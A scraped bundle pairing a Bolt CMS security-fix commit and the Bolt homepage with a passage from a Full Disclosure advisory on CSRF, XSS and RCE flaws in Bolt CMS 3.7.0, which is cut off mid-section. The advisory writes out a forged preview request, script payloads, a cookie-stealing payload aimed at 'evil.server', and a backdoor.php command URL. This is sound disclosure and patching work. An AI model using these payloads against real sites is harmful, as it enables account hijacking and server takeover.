=== Content from github.com_e1fd8e60_20250119_122654.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbolt%2Fbolt%2Fcommit%2Fb42cbfcf3e3108c46a80581216ba03ef449e419f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbolt%2Fbolt%2Fcommit%2Fb42cbfcf3e3108c46a80581216ba03ef449e419f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=bolt%2Fbolt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[bolt](/bolt)
/
**[bolt](/bolt/bolt)**
Public

* [Notifications](/login?return_to=%2Fbolt%2Fbolt) You must be signed in to change notification settings
* [Fork
  817](/login?return_to=%2Fbolt%2Fbolt)
* [Star
   4.2k](/login?return_to=%2Fbolt%2Fbolt)

* [Code](/bolt/bolt)
* [Issues
  51](/bolt/bolt/issues)
* [Pull requests
  5](/bolt/bolt/pulls)
* [Actions](/bolt/bolt/actions)
* [Projects
  0](/bolt/bolt/projects)
* [Wiki](/bolt/bolt/wiki)
* [Security](/bolt/bolt/security)
* [Insights](/bolt/bolt/pulse)

Additional navigation options

* [Code](/bolt/bolt)
* [Issues](/bolt/bolt/issues)
* [Pull requests](/bolt/bolt/pulls)
* [Actions](/bolt/bolt/actions)
* [Projects](/bolt/bolt/projects)
* [Wiki](/bolt/bolt/wiki)
* [Security](/bolt/bolt/security)
* [Insights](/bolt/bolt/pulse)

## Commit

[Permalink](/bolt/bolt/commit/b42cbfcf3e3108c46a80581216ba03ef449e419f)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#7853](https://github.com/bolt/bolt/pull/7853) from bolt/fix/csrf-check-on-preview

[Browse files](/bolt/bolt/tree/b42cbfcf3e3108c46a80581216ba03ef449e419f)
Browse the repository at this point in the history

```
Check CSRF on Preview page
```

* Loading branch information

[![@bobdenotter](https://avatars.githubusercontent.com/u/1833361?s=40&v=4)](/bobdenotter)

[bobdenotter](/bolt/bolt/commits?author=bobdenotter "View all commits by bobdenotter")
authored
May 7, 2020

2 parents
[693f1e4](/bolt/bolt/commit/693f1e47b69cd7c6240019cd7667d34f18a8d5b2)
+
[aba99d2](/bolt/bolt/commit/aba99d2744dac846bd6c4617ddd64223c5e6f2f7)

commit b42cbfc

 Show file tree

 Hide file tree

Showing
**5 changed files**
with
**33 additions**
and
**7 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src

  + src/Config.php
    [Config.php](#diff-9727fe62ad60c6637a7def31b06f908a39f99f118a78280469d7a62eb67a9d68)
  + Controller

    - Async

      * src/Controller/Async/FilesystemManager.php
        [FilesystemManager.php](#diff-21ede5c20d7cfd0c37590454370e3afb1c3f19e86aab4a5c0ff787f42cf6a40e)
    - src/Controller/Frontend.php
      [Frontend.php](#diff-ab9b9ba042a28cf808ff8148da3f2d850b6bda95000ba3ab51c8556d5535d326)
* tests/phpunit/unit/Controller

  + Async

    - tests/phpunit/unit/Controller/Async/FilesystemManagerTest.php
      [FilesystemManagerTest.php](#diff-c45ba76e3a7279d426bb510557bde7d2688f42f79dabd411226e661ca44d947c)
  + tests/phpunit/unit/Controller/FrontendTest.php
    [FrontendTest.php](#diff-e27fb0f392f3dd6ee0392e3f561968bd6550f4ba932369d2cf8708d852224226)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[src/Config.php](#diff-9727fe62ad60c6637a7def31b06f908a39f99f118a78280469d7a62eb67a9d68 "src/Config.php")

Show comments

[View file](/bolt/bolt/blob/b42cbfcf3e3108c46a80581216ba03ef449e419f/src/Config.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -311,7 +311,7 @@ protected function parseGeneral() |
|  |  | } |
|  |  |  |
|  |  | // To remove unacceptable / unwanted extensions from the list of Acceptable File Types |
|  |  | $removeFromAllowedFileTypes = explode('|', 'sh|asp|cgi|php|php3|ph3|php4|ph4|php5|ph5|phtm|phtml'); |
|  |  | $removeFromAllowedFileTypes = explode('|', 'sh|asp|cgi|php|php3|ph3|php4|ph4|php5|ph5|phtm|phtml|exe'); |
|  |  |  |
|  |  | // Create a bag with lowercased extensions |
|  |  | $bag = Bag::from($general['accept\_file\_types']); |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[src/Controller/Async/FilesystemManager.php](#diff-21ede5c20d7cfd0c37590454370e3afb1c3f19e86aab4a5c0ff787f42cf6a40e "src/Controller/Async/FilesystemManager.php")

Show comments

[View file](/bolt/bolt/blob/b42cbfcf3e3108c46a80581216ba03ef449e419f/src/Controller/Async/FilesystemManager.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -428,6 +428,7 @@ public function renameFolder(Request $request) |
|  |  | private function isExtensionChangedAndIsChangeAllowed($oldName, $newName) |
|  |  | { |
|  |  | $user = $this->getUser(); |
|  |  |  |
|  |  | if ($this->users()->hasRole($user['id'], 'root') || $this->users()->hasRole($user['id'], 'admin')) { |
|  |  | return true; |
|  |  | } |
| Expand Down  Expand Up | | @@ -465,11 +466,12 @@ private function validateFileExtension($filename) |
|  |  | if ($filename[0] === '.') { |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | // only whitelisted extensions |
|  |  | $extension = pathinfo($filename, PATHINFO\_EXTENSION); |
|  |  | $allowedExtensions = $this->getAllowedUploadExtensions(); |
|  |  |  |
|  |  | return $extension === '' || in\_array(mb\_strtolower($extension), $allowedExtensions); |
|  |  | return in\_array(mb\_strtolower($extension), $allowedExtensions); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
| Expand Down | |  |

7 changes: 7 additions & 0 deletions

7
[src/Controller/Frontend.php](#diff-ab9b9ba042a28cf808ff8148da3f2d850b6bda95000ba3ab51c8556d5535d326 "src/Controller/Frontend.php")

Show comments

[View file](/bolt/bolt/blob/b42cbfcf3e3108c46a80581216ba03ef449e419f/src/Controller/Frontend.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,6 +17,7 @@ |
|  |  | use Bolt\Storage\Repository\TaxonomyRepository; |
|  |  | use Bolt\Translation\Translator as Trans; |
|  |  | use Silex\ControllerCollection; |
|  |  | use Symfony\Component\HttpFoundation\JsonResponse; |
|  |  | use Symfony\Component\HttpFoundation\RedirectResponse; |
|  |  | use Symfony\Component\HttpFoundation\Request; |
|  |  | use Symfony\Component\HttpFoundation\Response; |
| Expand Down  Expand Up | | @@ -203,6 +204,12 @@ public function preview(Request $request, $contenttypeslug) |
|  |  | throw new MethodNotAllowedHttpException(['POST'], 'This route only accepts POST requests.'); |
|  |  | } |
|  |  |  |
|  |  | // Only accept requests with a valid token |
|  |  | $tokenValue = $request->request->get('content\_edit', ['\_token' => null])['\_token']; |
|  |  | if (!$this->isAllowed('dashboard') || !$this->isCsrfTokenValid($tokenValue, 'content\_edit')) { |
|  |  | return new Response('Not allowed or invalid CSRF token', Response::HTTP\_FORBIDDEN); |
|  |  | } |
|  |  |  |
|  |  | $contenttype = $this->getContentType($contenttypeslug); |
|  |  | $formValues = $request->request->all(); |
|  |  |  |
| Expand Down | |  |

24 changes: 21 additions & 3 deletions

24
[tests/phpunit/unit/Controller/Async/FilesystemManagerTest.php](#diff-c45ba76e3a7279d426bb510557bde7d2688f42f79dabd411226e661ca44d947c "tests/phpunit/unit/Controller/Async/FilesystemManagerTest.php")

Show comments

[View file](/bolt/bolt/blob/b42cbfcf3e3108c46a80581216ba03ef449e419f/tests/phpunit/unit/Controller/Async/FilesystemManagerTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -25,9 +25,10 @@ class FilesystemManagerTest extends ControllerUnitTest |
|  |  | { |
|  |  | const FILESYSTEM = 'files'; |
|  |  |  |
|  |  | const FILE\_NAME = '\_\_phpunit\_test\_file\_delete\_me'; |
|  |  | const FILE\_NAME = '\_\_phpunit\_test\_file\_delete\_me.txt'; |
|  |  | const FILE\_NAME\_NOT\_ALLOWED = '\_\_phpunit\_test\_file\_delete\_me.exe'; |
|  |  | const FILE\_NAME\_2 = '\_\_phpunit\_test\_file\_2\_delete\_me'; |
|  |  | const FILE\_NAME\_NOT\_ALLOWED\_2 = '\_\_phpunit\_test\_file\_delete\_me'; |
|  |  | const FILE\_NAME\_2 = '\_\_phpunit\_test\_file\_2\_delete\_me.txt'; |
|  |  | const FOLDER\_NAME = '\_\_phpunit\_test\_folder\_delete\_me'; |
|  |  | const FOLDER\_NAME\_2 = '\_\_phpunit\_test\_folder\_2\_delete\_me'; |
|  |  |  |
| Expand Down  Expand Up | | @@ -153,6 +154,23 @@ public function testCreateFileInvalidExtension() |
|  |  | $this->assertFalse($this->getService('filesystem')->has(self::FILESYSTEM . '://' . self::FILE\_NAME\_NOT\_ALLOWED)); |
|  |  | } |
|  |  |  |
|  |  | public function testCreateFileInvalidExtension2() |
|  |  | { |
|  |  | $this->setRequest(Request::create('/async/file/create', 'POST', [ |
|  |  | 'namespace' => self::FILESYSTEM, |
|  |  | 'parentPath' => '', |
|  |  | 'filename' => self::FILE\_NAME\_NOT\_ALLOWED\_2, |
|  |  | 'token' => $this->token, |
|  |  | ])); |
|  |  | $response = $this->controller()->createFile($this->getRequest()); |
|  |  |  |
|  |  | $this->assertInstanceOf(JsonResponse::class, $response); |
|  |  | $this->assertEquals(Response::HTTP\_BAD\_REQUEST, $response->getStatusCode()); |
|  |  |  |
|  |  | // Test whether the new file is not saved |
|  |  | $this->assertFalse($this->getService('filesystem')->has(self::FILESYSTEM . '://' . self::FILE\_NAME\_NOT\_ALLOWED)); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Duplicating a file five times should create FILENAME\_copy1-5.EXT. This should work for both regular filenames |
|  |  | \* and dotfiles. |
| Expand Down  Expand Up | | @@ -255,7 +273,7 @@ public function testInvalidRename() |
|  |  | \* Object doesn't exist |
|  |  | \*/ |
|  |  | $this->createObject($object, $data['old']); |
|  |  | $response = $this->renameObject($object, $data['old'] . '\_nonexistent', $data['new']); |
|  |  | $response = $this->renameObject($object, $data['old'] . '\_nonexistent.txt', $data['new']); |
|  |  |  |
|  |  | $this->assertInstanceOf(JsonResponse::class, $response); |
|  |  | $this->assertEquals(Response::HTTP\_NOT\_FOUND, $response->getStatusCode()); |
| Expand Down | |  |

3 changes: 1 addition & 2 deletions

3
[tests/phpunit/unit/Controller/FrontendTest.php](#diff-e27fb0f392f3dd6ee0392e3f561968bd6550f4ba932369d2cf8708d852224226 "tests/phpunit/unit/Controller/FrontendTest.php")

Show comments

[View file](/bolt/bolt/blob/b42cbfcf3e3108c46a80581216ba03ef449e419f/tests/phpunit/unit/Controller/FrontendTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -328,8 +328,7 @@ public function testPreview() |
|  |  |  |
|  |  | $response = $this->controller()->preview($this->getRequest(), 'pages'); |
|  |  |  |
|  |  | $this->assertTrue($response instanceof TemplateView); |
|  |  | $this->assertSame('record.twig', $response->getTemplate()); |
|  |  | $this->assertFalse($response instanceof TemplateView); |
|  |  | } |
|  |  |  |
|  |  | public function testListing() |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b42cbfc`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbolt%2Fbolt%2Fcommit%2Fb42cbfcf3e3108c46a80581216ba03ef449e419f) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bolt.cm_2d83d652_20250119_140526.html ===

[Skip to main content](#content)
[![Logo Bolt](/theme/boltcms-2021/img/logo.svg)](/)

* [Features](/features)
  + [For developers](/features-developers)
  + [For designers](/features-designers)
  + [For content creators](/features-editors)
* [Documentation](https://docs.boltcms.io)
* Resources
  + [Community](/community)
  + [Contribute](/contribute)
  + [Extensions](/extensions)
  + [Showcases](/showcases)
  + [Services and Support](/services-and-support)
* [No costs](/no-costs)
* [News](/news)
* [Try it now!](https://docs.boltcms.io/installation/installation)

# The *starting* *point* *of* *your* *new* *website*

## Open source

## Easy content creation

## Simple development

[Skip the carousel](#content-2)
[![Rich content editing](/thumbs/700×400/homepage/2020/09/Schermafbeelding-2020-09-24-om-12-47-22.png)](/files/homepage/2020/09/Schermafbeelding-2020-09-24-om-12-47-22.png)

[![Dashboard](/thumbs/700×400/127-0-0-1-8007-bolt-1.png)](/files/127-0-0-1-8007-bolt-1.png)

[![Uploaded media overview](/thumbs/700×400/homepage/2020/09/Schermafbeelding-2020-09-24-om-12-49-04.png)](/files/homepage/2020/09/Schermafbeelding-2020-09-24-om-12-49-04.png)

[![Internationalisation overview](/thumbs/700×400/127-0-0-1-8007-bolt-edit-locales-1.png)](/files/127-0-0-1-8007-bolt-edit-locales-1.png)

[![Default theme, based on Tailwind](/thumbs/700×400/homepage/2020/09/Schermafbeelding-2020-09-24-om-12-52-15.png)](/files/homepage/2020/09/Schermafbeelding-2020-09-24-om-12-52-15.png)

[![API overview screen](/thumbs/700×400/127-0-0-1-8007-bolt-api.png)](/files/127-0-0-1-8007-bolt-api.png)

### It's all in the details

![Symfony ](/files/symfony-black-03.png)
#### Symfony 5 extensions

There’s no limit to the functionality you can incorporate in your Bolt project. At its core, Bolt is a Symfony application, so you can use the tools provided by the framework.

![Twig](/files/branch.svg)
#### Twig templates

There's a reason why Twig is the de-facto standard across the PHP community. It is flexible, fast and secure. Take a look how easy it is to generate the HTML for your pages.

![Built-in internationalisation ](/files/translating.svg)
#### Built-in internationalisation

Need more languages? No problem, it's just one line of code. The even cooler thing? With field-level control you can decide *exactly* which parts of the page will be translated.

![API](/files/jack-in-the-box.svg)
#### Out-of-the-box API

Bolt provides a RESTful and GraphQL API. No extra configuration needed. Use the CMS in headless mode, alongside a static site generator, or simply to feed data into whatever other platform.

![Dummy content](/files/dummy.svg)
#### Dummy content

Dummy content. You need it to test, or to showcase your work to your clients. Putting it in there is tiresome, though. Good news: not anymore. All you need to do is use one single line of code.

![Content editors](/files/content.svg)
#### Best rich content editors

You get the best content editors: Article and Redactor. Fully licensed for use in Bolt itself. For free. With love. Because we believe creating and adapting content should be easy. Period.

[For
developers](/features-developers)
[For
designers](/features-designers)
[For
content editors](/features-content-editors)

![](https://boltcms.io/files/homepage/skoop.jpeg)

I spent a few hours yesterday and today building a new hobby site with [@BoltCMS](https://twitter.com/BoltCMS) and wow, the new version is FANTASTIC. It's so easy to get a site up and running. I'm really loving this.

![](https://boltcms.io/files/homepage/abjorkland.jpeg)

In the past I've looked at differenct CMS:s and tried my hands at WordPress. But being such a fan of [#Symfony](https://twitter.com/hashtag/Symfony?src=hashtag_click) I fell into the embrace of [@BoltCMS](https://twitter.com/BoltCMS) this week.

It's a CMS and a Symfony application! 💜

This week I've tried out multi-lang and extensions and am enamoured.

## Releasing the Bolt 3 to Bolt 5 upgrade guide

Hi there, Bolt Community 👋 At the end of August 2021, Bolt 5 was released. We are all very delighted with the adoption rate and the positive feedback you give us. From the Core Team to our community, a big thank you for helping us successfully release a new major version of your…

[Read the announcement](/newsitem/releasing-the-bolt-3-to-bolt-5-upgrade-guide)

## 🥳 🎁 Bolt 5 has been released

Hi there, Bolt community ☕️ We're excited to bring to you the news of the major Bolt 5 release today, 30 August 2021. In March of this year, we announced that the Core team is making progress towards a new major release. A little under two months ago, the major announcements&nbs…

[Read the announcement](/newsitem/bolt-5-has-been-released)

### Let's get started!

[Install Bolt](https://docs.bolt.cm/installation/installation)
[View websites built with Bolt](/showcases)

### Find help for your dream project

[Search for a developer](https://people.boltcms.io/)
[Add yourself as a developer](https://people.boltcms.io/join)

#### Features

* [For everyone](/features)
* [For developers](/features-developers)
* [For designers](/features-designers)
* [For content editors](/features-content-editors)

#### Resources

* [Community](/community)
* [Contribute](/contribute)
* [Extensions](/extensions)
* [Services and Support](/services-and-support)

#### Learn more

* [Documentation](https://docs.boltcms.io)
* [Best practice tips](https://bolt.tips)
* [Release Roadmap](https://roadmap.boltcms.io)

#### Explore more

* [Showcases](/showcases)
* [No costs](/no-costs)
* [News](/news)
* [Try it!](https://docs.boltcms.io/installation/installation)



=== Content from seclists.org_ffef055f_20250119_122652.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# Bolt CMS <= 3.7.0 Multiple Vulnerabilities - CSRF to RCE

---

*From*: Sivanesh Ashok <sivaneshashok () gmail com>

*Date*: Fri, 3 Jul 2020 17:31:32 +0530

---

```
##########################################################################
#                Bolt CMS <= 3.7.0 Multiple Vulnerabilities              #
##########################################################################

Author - Sivanesh Ashok | @sivaneshashok | stazot.com

Date         : 2020-03-24
Vendor       : <https://bolt.cm/>
Version      : <= 3.7.0
CVE          : CVE-2020-4040, CVE-2020-4041
Last Modified: 2020-07-03

--[ Table of Contents

00 - Introduction

01 - Exploit

02 - Cross-Site Request Forgery (CSRF)
        02.1 - Source code analysis
        02.2 - Exploitation
        02.3 - References

03 - Cross-Site Scripting (XSS)
    03.1 - Preview generator
        03.1.1 - Exploitation
    03.2 - System Log
        03.2.1 - Source code analysis
        03.2.2 - Exploitation
    03.3 - File name
        03.3.1 - Source code analysis
        03.3.2 - Exploitation
                03.3.3 - References
    03.4 - JS file upload
        03.4.1 - Exploitation
    03.5 - CKEditor4
        03.5.1 - Exploitation

04 - Remote Code Execution
        04.1 - Source code analysis
        04.2 - Exploitation
        04.3 - References

05 - Solution

06 - Contact

--[ 00 - Introduction

Bolt CMS is an open-source content management tool. This article details
the multiple vulnerabilities that I found in the application. The
vulnerabilities when chained together, resulted in a single-click RCE which
would allow an attacker to remotely take over the server. The link to the
exploit is provided in the next section.

--[ 01 - Exploit

Chaining all the bugs together results in a single-click RCE. The exploit
that does that can be found in the link below.
<https://github.com/staz0t/exploits/blob/master/SA20200324_boltcms_csrf_to_rce.html>

Host the exploit code in a webpage and send the link to the admin. When the
admin opens the link, backdoor.php gets uploaded and can be accessed via,
<http://targetbolt.com/files/backdoor.php?cmd={insert_cmd_here}>

--[ 02 - Cross-Site Request Forgery (CSRF)

Bolt CMS lacks CSRF protection in the preview generating endpoint. Previews
are intended to be generated by the admins, developers, chief-editors, and
editors, who are authorized to create content in the application. But due
to lack of CSRF protection, an unauthorized attacker can generate a
preview. This CSRF by itself does not have a huge impact. But this will be
used with the XSS, which are described below.

--[ 02.1 - Source code analysis

The preview generation is done
by preview() function which is defined in
vendor/bolt/bolt/src/Controller/Frontend.php:200 and there is no token
verification present in the function.

--[ 02.2 - Exploitation

The request that is can be forged is,

----[ request ]----

    POST /preview/page HTTP/1.1
    Host: localhost

content_edit[_token]=hTgbvurWl5fZ4m20bnb1AZCRrv8wFT0hzvjQi1TMW_wcontenttype=pages&title=title&slug=testpage1&teaser=teaser1&body=body1&id=1337

----[ request ]----

To exploit this vulnerability an attacker has to,

1. Make an HTML page with a form that has the required parameters shown
above. The content_edit[_token] is not required.

2. Use JS to auto-submit the form.

3. Host it on a website and send the link to the victim. i.e., an
authorized user.

When the victim opens the link, the browser will send the request to the
server and will follow the redirect to the preview page.

This CSRF by itself does not have a huge impact. But this will be used with
the XSS, which are described below.

--[ 02.3 - References

[CVE-2020-4040] -
<https://github.com/bolt/bolt/security/advisories/GHSA-2q66-6cc3-6xm8>

--[ 03 - Cross-Site Scripting (XSS)

The application is vulnerable to XSS in multiple endpoints, which could be
exploited by an attacker to execute javascript code in the context of the
victim user.

--[ 03.1 - Preview generator

The app uses CKEditor to get input from the users and hence any unsafe
inputs are filtered. But the request can be intercepted and manipulated to
add javascript in the content, which gets executed in the preview page.
Hence the preview generator is vulnerable to reflected XSS.

--[ 03.1.1 - Exploitation

----[ request ]----

    POST /preview/page HTTP/1.1
    Host: localhost

    contenttype=pages&title=title&slug=testpage1&teaser=teaser1&body=<script>alert(1)</script>&id=151

----[ request ]----

----[ response ]----
.
.
.
<p class="meta">
    Written by <em>Unknown</em> on Monday March 23, 2020
</p>
    teaser1
    <script>alert(1)</script>
.
.
.
----[ response ]----

As shown above the payload in the request's body parameter is reflected in
the response. An attacker can chain the above explained CSRF with this
vulnerability to execute javascript code on the context of the victim user.

--[ 03.2 - System Log

The 'display name' of the users is vulnerable to stored XSS. The value is
not encoded when displayed in the system log, by the functionality that
logs the event when an authorized user enables, disables or deletes user
accounts. The unencoded 'display name' is displayed in the system log,
hence allowing the execution of javascript in the context of admin or
developer since those are the roles that are allowed to access the system
log, by default.

--[ 03.2.1 - Source code analysis

The vulnerability is in the
vendor/bolt/bolt/src/Controller/Backend/Users.php where the user actions
are performed and logged. There are two variables that store and are used
to display user data in this code. $user and $userEntity. It can be seen
that $userEntity is initiated with the values after being passed to
$form->isValid(). This shows that $user has the unencoded input and
$userEntity has the encoded input.

In line 341, the code adds an entry to the log when a user updates their
profile. It can be seen that it uses $userEntity->getDisplayName(), hence
the displayed user input is encoded. But in line 279, there is a switch
case condition that logs the respective actions of enable, disable, delete
in the system log.

----[ code segment ]----

    switch ($action) {
        case 'disable':
            if ($this->users()->setEnabled($id, false)) {
                $this->app['logger.system']->info("Disabled user
'{$user->getDisplayname()}'.", ['event' => 'security']);

$this->flashes()->info(Trans::__('general.phrase.user-disabled', ['%s'
=> $user->getDisplayname()]));
            } else {

$this->flashes()->info(Trans::__('general.phrase.user-failed-disabled',
['%s' => $user->getDisplayname()]));
            }
            break;

        case 'enable':
            if ($this->users()->setEnabled($id, true)) {
                $this->app['logger.system']->info("Enabled user
'{$user->getDisplayname()}'.", ['event' => 'security']);

$this->flashes()->info(Trans::__('general.phrase.user-enabled', ['%s'
=> $user->getDisplayname()]));
            } else {

$this->flashes()->info(Trans::__('general.phrase.user-failed-enable',
['%s' => $user->getDisplayname()]));
            }
            break;

        case 'delete':
            if ($this->isCsrfTokenValid() && $this->users()->deleteUser($id)) {
                $this->app['logger.system']->info("Deleted user
'{$user->getDisplayname()}'.", ['event' => 'security']);

$this->flashes()->info(Trans::__('general.phrase.user-deleted', ['%s'
=> $user->getDisplayname()]));
            } else {

$this->flashes()->info(Trans::__('general.phrase.user-failed-delete',
['%s' => $user->getDisplayname()]));
            }
            break;

        default:
            $this->flashes()->error(Trans::__('general.phrase.no-such-action-for-user',
['%s' => $user->getDisplayname()]));
    }

---- [ code segment ]----

As shown above, the code uses $user->getDisplayName() instead of
$userEntity->getDisplayName(), which leads to the display of unencoded user
input.

--[ 03.2.2 - Exploitation

Here is how an attacker with any role can execute javascript code in the
context of the victim.

1.  Log in and go to your profile settings and set your display name to
some javascript payload.
   For example,
   <script>document.write('<img
src="<https://evil.server/?cookie='+document.cookie+'"/>>')</script>
   This payload will send the admin's cookies to attacker's server

2. Now request the admin (or the victim user) to disable your account.

When the admin visits the system log or the mini system log that is shown
on the right side of the Users & Permissions page, the payload gets
executed in the admin's browser.

--[ 03.3 - Filename

The file name is vulnerable to stored XSS. It is not possible to inject
javascript code in the file name when creating/uploading the file. But,
once created/uploaded, it can be renamed to inject the payload in it.

--[ 03.3.1 - Source code analysis

The function that is responsible for renaming files is renameFile(), which
is defined in
vendor/bolt/bolt/src/Controller/Async/FilesystemManager.php:335

----[ code segment ]----

    public function renameFile(Request $request)
    {
        // Verify CSRF token
        $this->checkToken($request);

        $namespace = $request->request->get('namespace');
        $parent = $request->request->get('parent');
        $oldName = $request->request->get('oldname');
        // value assigned without any validation
        $newName = $request->request->get('newname');

        if (!$this->isExtensionChangedAndIsChangeAllowed($oldName, $newName)) {
            return
$this->json(Trans::__('general.phrase.only-root-change-file-extensions'),
Response::HTTP_FORBIDDEN);
        }

        if ($this->validateFileExtension($newName) === false) {
            return $this->json( sprintf("File extension not allowed:
%s", $newName), Response::HTTP_BAD_REQUEST);
        }

        try {
            // renaming with the same unvalidated value
            $this->filesystem()->rename("$namespace://$parent/$oldName",
"$parent/$newName");

            return $this->json($newName, Response::HTTP_OK);
        } catch (ExceptionInterface $e) {
            $msg = Trans::__('Unable to rename file: %FILE%',
['%FILE%' => $oldName]);
            $this->logException($msg, $e);

            if ($e instanceof FileExistsException) {
                $status = Response::HTTP_CONFLICT;
            } elseif ($e instanceof FileNotFoundException) {
                $status = Response::HTTP_NOT_FOUND;
            } else {
                $status = Response::HTTP_INTERNAL_SERVER_ERROR;
            }

            return $this->json($msg, $status);
        }
    }

----[ code segment ]----

